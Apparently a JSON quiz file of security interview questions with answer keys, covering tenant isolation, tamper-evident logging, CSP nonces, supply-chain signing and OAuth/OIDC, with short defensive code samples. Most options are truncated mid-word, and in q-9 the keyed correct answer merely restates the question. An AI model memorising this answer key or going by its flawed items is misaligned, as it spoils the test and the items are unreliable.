[
  {
    "id": "test-security",
    "channelId": "security",
    "channelName": "Security",
    "title": "Security Knowledge Test",
    "description": "Test your understanding of Security with 25 questions.",
    "questions": [
      {
        "id": "security-q-0",
        "questionId": "q-21398",
        "question": "In a high-scale SaaS platform with hundreds of microservices writing logs to a central sink, logs may contain PII and tenant data. A pen-test shows potential log-tampering and cross-tenant leakage via compromised nodes. Propose a concrete end-to-end tamper-evident logging design: per-tenant signing, cryptographic chaining, immutable storage, verifiable roots, and CI checks. Outline components, deployment steps, testing, and what you would implement first to prove tampering resilience?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Partition data by tenant using per-tenant prefixes in the data lake and enforce envelope encryption with per-tenant keys via KMS/HSM. Require mTLS between services, least-privilege IAM, and per-tenant",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Implement per-tenant isolation with Firecracker microVMs or WASM sandboxes and memory-safe runtimes (Rust/Go). Attest function integrity at cold-start via TPM/Secure Enclave or SPIFFE/SVID attestation",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Design per-tenant secrets with envelope encryption: edge stores secrets encrypted with a per-tenant data key; data keys are wrapped by an HSM-backed master key in a central vault and rotated on schedu",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Design a tamper-evident logging stack: per-tenant signing with rotated KMS keys, cryptographic chaining of log entries (hash(prev) + payload), append-only immutable storage (S3 Object Lock or similar)",
            "isCorrect": true
          }
        ],
        "explanation": "## Why This Is Asked\nEngaging; tests concrete tamper-resistance instincts in logging.\n\n## Key Concepts\n- Tamper-evident logs\n- Per-tenant signing and KMS\n- Append-only storage\n- Merkle roots for integrity\n- Verification pipeline and CI gates\n\n## Code Example\n```javascript\n// signing a log line with tenant-scoped key\nconst key = kms.getKey(tenantId);\nconst last = getLastHash(tenantId);\nconst payload = JSON.stringify(log);\nconst hash = sha256(last + payload);\nconst sig = sign(hash, key);\n```\n\n## Follow-up Questions\n- How would you rotate keys without breaking the chain?\n- How would you verify logs after a breach and during forensic analysis?",
        "difficulty": "advanced"
      },
      {
        "id": "security-q-1",
        "questionId": "q-24131",
        "question": "Scenario: A multi-tenant chat app uses a single API gateway and a PostgreSQL backend. Each request carries a JWT with a tenant_id, but a recent security test shows a possible bypass when the gateway trusts the token without strict tenant-level checks in all endpoints. Propose a concrete, beginner-friendly plan to enforce per-tenant isolation across APIs, covering authorization checks, parameter validation, and deployment safeguards?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Implement a token-binding approach in a multi-cluster mesh: require mTLS with SPIFFE IDs for all service calls, issue short-lived JWTs (5–10 minutes) bound to a per-call ephemeral key, rotate JWKS eve",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Require tenant_id consistency: middleware verifies that the JWT's tenant_id matches the resource's tenant_id in every endpoint; reject otherwise. Enable PostgreSQL RLS with policies on all tables to f",
            "isCorrect": true
          },
          {
            "id": "c",
            "text": "Plan uses per-tenant KMS keys with envelope encryption, end-to-end TLS in Kafka/Spark, and field-level encryption before data hits S3. Enforce rotation and revocation of CMKs, strict IAM/VPC controls,",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Implement tenant-scoped data partitions with per-tenant keys, enforce mTLS/SPIFFE identities, and isolate rules sandbox (WASM) with a minimal API surface. Apply envelope encryption for logs, and tampe",
            "isCorrect": false
          }
        ],
        "explanation": "## Why This Is Asked\nThis question checks practical, beginner-friendly steps to enforce strict per-tenant isolation in a real API stack, not just high-level definitions.\n\n## Key Concepts\n- Tenant isolation\n- JWT tenant_id verification\n- PostgreSQL Row-Level Security (RLS)\n- Deny-by-default authorization\n- Per-endpoint guardrails and logging\n- CI/CD testing for multi-tenant access\n\n## Code Example\n```javascript\n// Node.js middleware example\nfunction tenantMiddleware(req, res, next) {\n  const tokenTid = req.user?.tenant_id;\n  const pathTid = req.params.tenant_id || req.body.tenant_id;\n  if (!pathTid || tokenTid !== pathTid) return res.status(403).send(\"Forbidden\");\n  next();\n}\n```\n\n## Follow-up Questions\n- How would you test RLS policies in a CI pipeline?\n- How would you monitor for tenant_id leakage in production?",
        "difficulty": "beginner"
      },
      {
        "id": "security-q-2",
        "questionId": "q-230",
        "question": "How would you implement a Content Security Policy (CSP) with nonce-based inline script protection to prevent XSS while maintaining compatibility with third-party analytics?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Define a multi-layered chain: build-time SBOM with verifiable provenance; hardware-backed attestation for every edge image (TPM/SE); runtime integrity checks on startup and during updates; per-region",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Sanitize server-side SVG uploads to prevent XSS. Accept only image/svg+xml and cap size; run DOMPurify with jsdom to strip <script>, onload, and javascript: URLs, remove external references; render vi",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Generate cryptographically secure nonces per request and implement CSP headers with framework-specific middleware, ensuring inline scripts use the nonce while third-party analytics are allowlisted.",
            "isCorrect": true
          },
          {
            "id": "d",
            "text": "Implement per-tenant API keys with versioned signing (v1/v2) using a two-phase rollout: emit v2 keys while maintaining v1 during a grace period, validate both versions via JWKS, then decommission v1 after migration.",
            "isCorrect": false
          }
        ],
        "explanation": "## Concept Overview\nContent Security Policy with nonce-based protection provides granular control over inline script execution while preventing XSS attacks. Nonces are unique, cryptographically random values generated per HTTP request that must match both in the CSP header and script tags.\n\n## Implementation Details\n\n### Node.js/Express\n```javascript\nconst crypto = require('crypto');\n\nfunction generateNonce() {\n  return crypto.randomBytes(16).toString('base64');\n}\n\napp.use((req, res, next) => {\n  const nonce = generateNonce();\n  res.locals.nonce = nonce;\n  res.setHeader('Content-Security-Policy', \n    `script-src 'nonce-${nonce}' 'self' https://www.google-analytics.com;`\n  );\n  next();\n});\n```\n\n### React/Next.js\n```javascript\n// pages/_document.js\nimport Document, { Html, Head, Main, NextScript } from 'next/document';\n\nclass MyDocument extends Document {\n  static async getInitialProps(ctx) {\n    const nonce = crypto.randomBytes(16).toString('base64');\n    ctx.res.setHeader('Content-Security-Policy',\n      `script-src 'nonce-${nonce}' 'self' https://analytics.google.com;`\n    );\n    const initialProps = await Document.getInitialProps(ctx);\n    return { ...initialProps, nonce };\n  }\n\n  render() {\n    return (\n      <Html>\n        <Head>\n          <script nonce={this.props.nonce}>\n            // Analytics inline script\n          </script>\n        </Head>\n        <body>\n          <Main />\n          <NextScript nonce={this.props.nonce} />\n        </body>\n      </Html>\n    );\n  }\n}\n```\n\n### Python/Django\n```python\nimport secrets\nfrom django.utils.deprecation import MiddlewareMixin\n\nclass CSPNonceMiddleware(MiddlewareMixin):\n    def process_request(self, request):\n        nonce = secrets.token_urlsafe(16)\n        request.csp_nonce = nonce\n\n    def process_response(self, request, response):\n        nonce = getattr(request, 'csp_nonce', None)\n        if nonce:\n            response['Content-Security-Policy'] = \\\n                f\"script-src 'nonce-{nonce}' 'self' https://www.google-analytics.com;\"\n        return response\n```\n\n### Security Best Practices\n- Use 128+ bit entropy for nonce generation\n- Set strict CSP directives for other resource types\n- Implement CSP violation reporting with `report-uri`\n- Consider `strict-dynamic` for modern browsers instead of nonces\n- Test with CSP Evaluator tools before production deployment\n\n### Third-party Analytics Handling\nModern analytics platforms support CSP compliance:\n- Google Analytics 4: Add `https://www.google-analytics.com` to script-src\n- Segment: Use `https://cdn.segment.com`\n- Hotjar: Add `https://*.hotjar.com`\nFor legacy analytics requiring inline scripts, consider proxy implementations or migrate to CSP-compatible versions.",
        "difficulty": "intermediate"
      },
      {
        "id": "security-q-3",
        "questionId": "q-15645",
        "question": "You are prototyping a serverless image upload feature for a ride-sharing app. Users upload photos that are stored in a cloud bucket via signed URLs. Describe a beginner-friendly plan to secure this pipeline end-to-end: validate file type and size at client and server, scan for malware, enforce least privilege IAM roles, use temporary signed URLs with expirations, and ensure logs do not contain PII?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Implement a signed plugin manifest and SBOM, load plugins in a WASM sandbox or isolated iframe with a minimal API surface; verify signing via Sigstore/Cosign and hardware-backed attestation; enforce l",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "A WAF inspects HTTP/S requests, applies security rules, and blocks malicious traffic before it reaches the web application.",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Implement a layered guard: set a max query depth (4–5), a cost model (max cost ~1000), and enable persisted queries to prevent ad-hoc bursts. Use a gateway (e.g., Apollo Gateway) to enforce these rule",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Enforce client and server validation for type and size; verify magic bytes instead of extensions; run malware scanning on uploads; store in a dedicated bucket with least-privilege IAM; generate short-",
            "isCorrect": true
          }
        ],
        "explanation": "## Why This Is Asked\nAssesses end-to-end security hygiene for assets moving from client to cloud storage in a beginner-friendly way, focusing on practical steps rather than theory.\n\n## Key Concepts\n- Client and server validation, MIME vs magic bytes\n- Malware scanning in upload pipelines\n- Least-privilege IAM for storage buckets\n- Short-lived signed URLs and expirations\n- Logging redaction for PII and monitoring\n\n## Code Example\n```javascript\n// middleware to validate image uploads (Express + Multer-like placeholder)\nconst ALLOWED = ['image/jpeg','image/png','image/webp'];\nfunction validateUpload(req, res, next) {\n  const { 'content-type': ct } = req.headers;\n  if (!ALLOWED.includes(ct)) return res.status(400).send('Unsupported type');\n  const size = parseInt(req.headers['content-length'] || '0', 10);\n  if (size > 5 * 1024 * 1024) return res.status(413).send('File too large');\n  next();\n}\n```\n\n## Follow-up Questions\n- How would you test this pipeline end-to-end?\n- What are common bypasses (e.g., content-type spoofing) and mitigations?\n- How would you handle large files and retries in a serverless context?",
        "difficulty": "beginner"
      },
      {
        "id": "security-q-4",
        "questionId": "q-21813",
        "question": "You run a real-time collaboration app using WebRTC; signaling and media pass through a shared signaling server and tenants have isolated workspaces. A misconfigured access policy could expose per-room IDs, participant IPs, and metadata to other tenants. Propose a concrete end-to-end mitigation plan: tenant isolation, per-room authorization, encrypted signaling, tamper-evident logs, and an incident-response runbook with rollback steps. List technologies and trade-offs?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Implement per-IP and per-token rate-limiting using a Redis-backed token-bucket with a Lua script. Apply different limits per route (login stricter) and a small burst tolerance (e.g., 20). Return 429 w",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Enforce tenant-scoped signaling namespaces, per-room ACLs at the gateway, and mTLS with short-lived JWTs for room access. Encrypt signaling in transit (TLS) and at rest (envelope encryption with KMS).",
            "isCorrect": true
          },
          {
            "id": "c",
            "text": "Design a multi-tenant cloud storage architecture with strict tenant data isolation, even in the event of storage node compromise. Key components include per-tenant encryption keys managed via a KMS, envelope encryption…",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Use policy-as-code: add an OPA policy that blocks any Terraform plan that creates an AWS S3 bucket with a public access policy unless a specific tag PUBLIC=true is present. Enforce in CI (terraform va",
            "isCorrect": false
          }
        ],
        "explanation": "## Why This Is Asked\nReal-time collaboration platforms face cross-tenant leakage via signaling policies; this tests practical design for isolation, crypto choices, logging hygiene, and runbooks.\n\n## Key Concepts\n- Tenant isolation and per-room authorization\n- mTLS, short-lived JWTs, and ACLs for signaling\n- In-transit and at-rest encryption with KMS envelope\n- Tamper-evident logs and per-tenant audits\n- Incident response runbooks and rollbacks\n\n## Code Example\n```javascript\n// Verify room access for a tenant token (pseudo)\nfunction authorizeTenant(token, roomId, tenant) {\n  const payload = verifyJWT(token);\n  return payload.tenant === tenant && payload.rooms.includes(roomId);\n}\n```\n\n## Follow-up Questions\n- How would you test cross-tenant leakage in CI/CD and in production? \n- What are trade-offs of per-tenant namespaces vs multi-tenant beaconing?",
        "difficulty": "advanced"
      },
      {
        "id": "security-q-5",
        "questionId": "q-9721",
        "question": "Design a secure, scalable defense-in-depth plan against a supply-chain compromise for serverless runtimes and container images used across Google, DoorDash, and Amazon-scale services. Include image signing/attestation (Sigstore/Notary), runtime attestation, immutable logs, secure update pipelines, and incident response. How would you test and validate the plan before and after deployment?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Require image signing and attestation for all runtimes (Sigstore/Notary), immutable tamper-evident logs, and runtime attestation before execution (trusted compute base). Use a GitOps pipeline with aut",
            "isCorrect": true
          },
          {
            "id": "b",
            "text": "Implement tenant-scoped Unity Catalog with per-tenant schemas; enforce Row-Level Security and dynamic masking on all PII fields; store secrets in Databricks Secret Scopes with least-privilege access a",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Quarantine the affected image digest in the registry, halt pulls, and rollback to the last-good revision using blue/green deployment. Enforce image signing with Sigstore and admission control via OPA",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Define a field-level authorization map (field → required permission). Extend resolvers with a wrapper that checks user roles and tenantId in the Graph context before resolving each field; prune or err",
            "isCorrect": false
          }
        ],
        "explanation": "## Why This Is Asked\nAssesses depth in securing supply chains, runtime enforcement, and incident response at scale.\n\n## Key Concepts\n- Software supply chain security\n- Image signing and attestation\n- Runtime attestation and enforceable policy\n- Immutable audit logs, tamper-evident design\n- Secure update pipelines and incident response\n\n## Code Example\n```javascript\n// Pseudo-sign-verify example (Node.js)\nconst crypto = require('crypto');\nasync function verify(manifestPath, sigPath, pubKeyPath){\n  const m = await require('fs').promises.readFile(manifestPath);\n  const s = await require('fs').promises.readFile(sigPath);\n  const pub = await require('fs').promises.readFile(pubKeyPath);\n  const v = crypto.createVerify('RSA-SHA256');\n  v.update(m); v.end();\n  return v.verify(pub, s);\n}\n```\n\n## Follow-up Questions\n- How would you test key rotation and revocation?\n- How would you detect and respond to a signing-key compromise?",
        "difficulty": "advanced"
      },
      {
        "id": "security-q-6",
        "questionId": "q-26767",
        "question": "You're maintaining a public REST API behind a gateway on AWS/GCP used by mobile clients. Production error responses leak stack traces. Propose a beginner-friendly plan to prevent data leakage while keeping debugging possible. Include concrete steps and a minimal Express error handler concept (no full code)?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Implement a defense-in-depth strategy using explicit tenant-scoped bucket policies, least-privilege IAM roles with short-lived credentials, and automated CI checks to detect policy drift. **1. Path-Prefix Isolation** En…",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Centralize error handling and return a generic 500 in production. Log full details to a secure sink, but redact secrets from responses. Use the NODE_ENV flag to switch between verbose developer messag",
            "isCorrect": true
          },
          {
            "id": "c",
            "text": "Implement a SPIFFE-based mTLS with a hardware-backed CA using an HSM. Use short-lived leaf certs that rotate every few minutes, automatic revocation via CRL/OCSP, and per-service attestation at sideca",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Require signed plugin attestations (Sigstore/cosign) plus SBOMs; verify at load against a trusted root; sandbox plugins with WASM engine (Wasmtime) with per-plugin quotas and sandboxed syscalls; isola",
            "isCorrect": false
          }
        ],
        "explanation": "Why This Is Asked: Tests the ability to implement safe, production-grade error handling without sacrificing debugging. Key concepts: error handling patterns, environment-based behavior, secure logging, and data redaction. Code Example: see below. Follow-ups evaluate nuance in error types and practical guardrails.",
        "difficulty": "beginner"
      },
      {
        "id": "security-q-7",
        "questionId": "q-7383",
        "question": "Design a secure extension ecosystem for a multi-tenant video collaboration platform (Zoom/Salesforce/Anthropic). Extensions run in meetings with access to sensitive metadata. Outline end-to-end controls: code signing, SBOM, per-plugin isolation (WASM sandbox or iframe), runtime attestation, least-privilege API surface, permission prompts, revocation, rotation, and an incident response plan. What trade-offs would you make?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Design a per-tenant sandbox using WASM with a limited API surface; isolate plugins in lightweight containers or user namespaces; enforce model provenance via signing in a trusted registry; require run",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Implement a signed plugin manifest and SBOM, load plugins in a WASM sandbox or isolated iframe with a minimal API surface; verify signing via Sigstore/Cosign and hardware-backed attestation; enforce l",
            "isCorrect": true
          },
          {
            "id": "c",
            "text": "Design per-tenant secrets with envelope encryption: edge stores secrets encrypted with a per-tenant data key; data keys are wrapped by an HSM-backed master key in a central vault and rotated on schedu",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Architect edge-centric security by running per-tenant analytics inside hardware enclaves (SGX/SEV) on each gateway. Implement per-tenant envelope encryption with KEKs stored in a central KMS, sealing data at rest. Requi…",
            "isCorrect": false
          }
        ],
        "explanation": "## Why This Is Asked\nAssess design depth for plugin security in a real product, covering code signing, isolation, attestation, and operational controls.\n\n## Key Concepts\n- Code signing and SBOM\n- Isolation boundaries (WASM iframe)\n- Hardware-backed attestation\n- Least-privilege API design\n- Token binding and rotation\n\n## Code Example\n```javascript\n// Pseudocode: plugin load with whitelist API surface\nfunction loadPlugin(manifest, sig) {\n  if (!verifySignature(manifest, sig)) throw 'Invalid';\n  const plugin = instantiateWasm(manifest.entry);\n  return plugin;\n}\n```\n\n## Follow-up Questions\n- How would you rollback a compromised plugin without impacting running meetings?\n- Which trade-offs between WASM sandbox and iframe isolation would influence performance?",
        "difficulty": "intermediate"
      },
      {
        "id": "security-q-8",
        "questionId": "q-4501",
        "question": "Describe a beginner-friendly approach to implementing tamper-evident security event logging for authentication across a microservices-based travel platform. Specify what data to log, how to prevent tampering (append-only storage, cryptographic signing), how to validate logs during an incident, and how to handle privacy/PII?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Two-artifact signing: root key in an HSM signs a per-ECU manifest listing model, runtime, and driver components. Each ECU performs TPM-based attestation at boot and OTA, and validates deltas against a",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Adopt a secrets-first workflow: store API keys in Databricks Secret Scopes and fetch with dbutils.secrets.get; remove keys from notebooks and repos. Enforce least privilege on who can access scopes; use environment vari…",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Enforce cache-key isolation: partition caches by tenant, derive keys from tenant_id, URL, method, and a hash of headers that affect content; reject or canonicalize Vary/Accept-Encoding; implement per-",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Implement append-only logs per service with the following data fields: user_id (hashed), timestamp, event_type, IP address, device information, and authentication outcome, while ensuring all PII is properly redacted. St…",
            "isCorrect": true
          }
        ],
        "explanation": "## Why This Is Asked\nThis question tests the ability to design practical, auditable security logging systems that remain functional under abuse or compromise while demonstrating understanding of integrity constraints and privacy requirements within beginner-friendly limitations.\n\n## Key Concepts\n- Tamper-evident logging mechanisms\n- Append-only storage architectures\n- Cryptographic signing (HMAC, digital signatures)\n- PII redaction and privacy protection\n- Incident validation procedures\n\n## Code Example\n```javascript\nconst crypto = require('crypto');\nconst logLine = JSON.stringify(logEntry);\nconst signature = crypto.createHmac('sha256', SECRET_KEY).update(logLine).digest('hex');\n```\n\n## Follow-up Questions\n- How would you handle key rotation for long-term log integrity?\n- What monitoring would you implement to detect log tampering attempts in real-time?\n- How would you scale this approach across hundreds of microservices?",
        "difficulty": "beginner"
      },
      {
        "id": "security-q-9",
        "questionId": "q-17894",
        "question": "Design an end-to-end isolation plan for a multi-tenant security API that spawns ephemeral AWS Lambda and Google Cloud Run tasks to process tenant data across clouds. How would you enforce tenant boundaries, manage keys, and ensure auditability under scale? Include specific technologies, deployment steps, and trade-offs suitable for Adobe, Stripe, and Citadel?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Split Snowflake access by service and enforce least privilege: create per-service roles with only needed schemas/tables; assign a dedicated warehouse per service; move API keys/secrets to a vault and",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Design an end-to-end isolation plan for a multi-tenant security API that spawns ephemeral AWS Lambda and Google Cloud Run tasks to process tenant data across clouds. How would you enforce tenant boundaries, manage keys,…",
            "isCorrect": true
          },
          {
            "id": "c",
            "text": "Enforce a 5 MB cap; validate MIME and extension; store under per-user UUID path in object storage; trigger malware scan before finalizing; publish via time-limited signed URLs; validate content on dow",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Use PKCE: generate a high-entropy code_verifier (43–128 chars), compute code_challenge = base64url(SHA-256(code_verifier)). Open the auth page with redirect_uri. After login, exchange the code at the",
            "isCorrect": false
          }
        ],
        "explanation": "## Why This Is Asked\nThis question evaluates practical cross-cloud isolation for serverless multi-tenant architectures and assesses familiarity with real-world tooling, IAM patterns, and operational policies.\n\n## Key Concepts\n- Tenant isolation (logical and physical)\n- Serverless security boundaries\n- Key management (KMS/Cloud KMS)\n- IAM and service account design\n- CI/CD policy enforcement\n- Incident response and recovery\n\n## Trade-offs for Target Companies\n- **Adobe**: Prioritize data residency and content isolation; consider customer-managed keys with HSM backing\n- **Stripe**: Emphasize financial-grade auditability, deterministic ordering, and strong consistency; prioritize sub-millisecond latency for payment processing\n- **Citadel**: Focus on high-frequency trading scenarios requiring predictable performance; prioritize deterministic compute allocation and low-cold-start configurations",
        "difficulty": "advanced"
      },
      {
        "id": "security-q-10",
        "questionId": "q-30152",
        "question": "Describe a secure, multi-region key management strategy for a multi-tenant service that uses envelope encryption and per-tenant data keys. Specify how you would implement key rotation, tenant isolation, audit logging, key revocation, and incident response, including concrete tech choices (e.g., AWS KMS vs HashiCorp Vault, HSM usage) and trade-offs between latency and security?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Bind tenant context at the edge using mTLS authentication and per-request tenancy tokens; enforce strict per-tenant Redis namespaces with ACL-based access controls; implement envelope encryption with tenant-scoped keys…",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Implement multi-layered validation using JSON Schema with strict whitelisting, recursive nested object validation, type and range constraints, and input sanitization at each level.",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Per-tenant HMAC keys stored in an HSM with envelope encryption; rotate keys every 24 hours with versioning; require a nonce and timestamp in webhook payload and header; implement strict replay protect",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Propose a multi-region envelope encryption design with per-tenant data keys (DEKs) wrapped by a master key (CMK). Use AWS KMS or Vault with HSM-backed CMKs; rotate DEKs quarterly and CMKs every 12-24",
            "isCorrect": true
          }
        ],
        "explanation": "## Why This Is Asked\n\nDesigning cryptographic key management across regions with tenant isolation tests the ability to reason about threats, rotation cadence, and operational trade-offs.\n\n## Key Concepts\n\n- Envelope encryption\n- CMKs/DEKs in KMS or Vault\n- HSM-backed keys and PCI/FIPS compliance\n- Rotation, revocation, and auditability\n- Latency vs security trade-offs\n\n## Code Example\n\n```javascript\n// Pseudo-envelope encryption sketch\nfunction sealWithDEK(data, dek) { return encrypt(data, dek); }\nfunction wrapDEK(dek, cmk) { return kmsWrap(dek, cmk); }\n```\n\n## Follow-up Questions\n\n- How would you test key rotation without impacting live traffic?\n- What monitoring alerts would indicate a compromised CMK?",
        "difficulty": "advanced"
      },
      {
        "id": "security-q-11",
        "questionId": "q-5203",
        "question": "In a multi-tenant data science platform used by enterprise customers (Databricks, Oracle, Two Sigma), design a security model for a shared Kubernetes workspace (notebooks, datasets, model registry) that guarantees tenant isolation, secrets hygiene, and provenance verification. Include runtime isolation, secret management (envelope encryption with KMS/HSM), access control (RBAC/ABAC), encryption in transit at all paths, SBOM enforcement for artifacts, and an incident-response playbook with rotation and revocation steps?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Require per-tenant WASM modules to be digitally signed with Ed25519 and attested by a hardware-backed KMS; whitelist host functions; apply strict linear memory and CPU quotas via sandbox (WASM isolate",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "Implement per-tenant API keys with versioned signing (v1/v2) using a two-phase rollout: emit v2 keys while maintaining v1 during a grace period, validate both versions via JWKS, then decommission v1 after migration.",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "Isolate tenants via Kubernetes namespaces and per-tenant SPIFFE identities; require mutual TLS between services; store secrets as envelope-encrypted data keys in a HSM-backed KMS with per-tenant CMKs",
            "isCorrect": true
          },
          {
            "id": "d",
            "text": "Implement strict input validation with an allowlist using Joi or Yup; never merge raw input into queries; reject keys starting with '$' or '.'; use a fixed query builder that only accepts known fields",
            "isCorrect": false
          }
        ],
        "explanation": "Why This Is Asked\nTests a practical, scalable security design for a shared data science platform, stressing real-world controls and trade-offs.\n\nKey Concepts\n- Tenant isolation and RBAC/ABAC\n- Secrets management with envelope encryption and HSM/KMS\n- Provenance and SBOM enforcement\n- Mutual TLS and per-service identities\n- Incident response: rotation, revocation, revocation scope\n\nCode Example\n```yaml\n# Namespace per tenant\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: tenant-a\n```\n\nFollow-up Questions\n- How would you handle cross-tenant data egress auditing?\n- What metrics and alerts would you implement for rapid breach containment?",
        "difficulty": "intermediate"
      },
      {
        "id": "security-q-12",
        "questionId": "q-302",
        "question": "Explain the technical differences between OAuth 2.0 authorization flows and OpenID Connect authentication, including token structures, validation patterns, and security considerations?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Plan: introduce a redaction utility and a log-wrapping layer that masks fields: Authorization, token, password, id, and any per-tenant keys. Enforce structured JSON logs and redact recursively. Add CI",
            "isCorrect": false
          },
          {
            "id": "b",
            "text": "OAuth 2.0 handles authorization with access tokens (Bearer format) for resource access, while OIDC adds authentication layer with ID tokens (JWT) containing user identity. OIDC introduces standard scopes (openid, profil…",
            "isCorrect": true
          },
          {
            "id": "c",
            "text": "Per-tenant HSM-backed signing keys that issue short-lived JWTs (5-15 min) bound to device attestation and the target resource. Use mTLS between edge and auth services, token binding (audience, nonce),",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Design a per-tenant WASM sandbox plan: plugins signed with Vault's Ed25519 keys; per-tenant identity bound to short-lived JWTs for API access; limit plugin host surface with a restricted API gateway;",
            "isCorrect": false
          }
        ],
        "explanation": "## Interview Context\nThis question assesses your understanding of modern authentication/authorization patterns used in enterprise systems. It's crucial for security architects and full-stack developers implementing SSO or API security.\n\n## Technical Breakdown\n\n### OAuth 2.0 Authorization Code Flow\n- **Purpose**: Delegated authorization for resource access\n- **Token Structure**: Bearer access tokens (opaque or JWT)\n- **Security**: PKCE mandatory for public clients, confidential clients use client secrets\n- **Flow**: Auth request → User consent → Authorization code → Token exchange\n\n### OpenID Connect Authentication\n- **Purpose**: Authentication layer on OAuth 2.0\n- **Token Structure**: JWT ID tokens with standardized claims\n- **Key Claims**: `iss` (issuer), `sub` (subject), `aud` (audience), `exp`, `iat`, `nonce`\n- **Additional Scopes**: `openid`, `profile`, `email`\n\n### Validation Patterns\n```javascript\n// JWT ID Token Validation Example\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\n\nconst client = jwksClient({\n  jwksUri: 'https://auth.example.com/.well-known/jwks.json'\n});\n\nfunction getKey(header, callback) {\n  client.getSigningKey(header.kid, (err, key) => {\n    callback(null, key.publicKey);\n  });\n}\n\njwt.verify(idToken, getKey, {\n  audience: 'your-client-id',\n  issuer: 'https://auth.example.com',\n  algorithms: ['RS256']\n}, (err, decoded) => {\n  // Validate claims: nonce, exp, iss, aud\n});\n```\n\n### Security Considerations\n- **PKCE**: Prevents authorization code interception\n- **State Parameter**: CSRF protection\n- **Nonce**: Replay protection for ID tokens\n- **JWKS Rotation**: Seamless key updates without downtime\n- **Token Storage**: HttpOnly, Secure cookies for web apps\n- **Refresh Tokens**: Secure storage, rotation, and revocation\n\n### Production Architecture\n```\nClient App → Authorization Server (PKCE) → Access Token\n                      ↓\nResource Server ← JWT Validation ← JWKS Endpoint\n                      ↓\nUser Identity ← ID Token Claims ← OIDC Discovery\n```\n\n## Follow-up Questions\n1. How would you implement token refresh and rotation in a high-availability system?\n2. What's the difference between client credentials flow and authorization code flow for machine-to-machine communication?\n3. How would you handle token revocation and immediate logout across multiple services?",
        "difficulty": "beginner"
      },
      {
        "id": "security-q-13",
        "questionId": "q-29036",
        "question": "You manage a global, multi-tenant telemetry platform that ingests web-app data into a streaming pipeline (Kafka-like) and runs per-tenant processing. A misconfigured policy could leak data across tenants. Propose an end-to-end hardening plan covering: 1) per-tenant access controls (RBAC/ABAC) and data-plane isolation, 2) envelope encryption with per-tenant keys and rotation, 3) topic ACLs and service-mesh isolation, 4) runtime attestation for processing containers, 5) tamper-evident logging with secure storage, and 6) an incident-response rollback playbook including data replay/purge. Include concrete technologies and trade-offs?",
        "type": "single",
        "options": [
          {
            "id": "a",
            "text": "Implement tenant-scoped isolation with per-tenant keys and RBAC/ABAC, enforce Kafka topic ACLs, use envelope encryption with a KMS (per-tenant CMK), source/processing attestation (e.g., SPIRE/NodeAtt)",
            "isCorrect": true
          },
          {
            "id": "b",
            "text": "Design uses envelope encryption: each tenant has a unique Data Encryption Key (DEK) wrapped by a Central Master Key stored in a FIPS-140-2 HSM/KMS. Use per-tenant IAM roles, no shared DEKs, and automa",
            "isCorrect": false
          },
          {
            "id": "c",
            "text": "I'd design a zero-trust, multi-layer security plan: per-tenant envelope encryption with KMS/HSM-backed keys; mutual TLS with SPIFFE IDs for all clients; platform attestation (TEE/TPM) for client SDKs",
            "isCorrect": false
          },
          {
            "id": "d",
            "text": "Each tenant uses a unique CMK in hardware-backed KMS; data is envelope-encrypted per tenant. Enforce per-tenant compute namespaces with strict micro-segmentation. WASM/UDFs run in sandboxed runtimes t",
            "isCorrect": false
          }
        ],
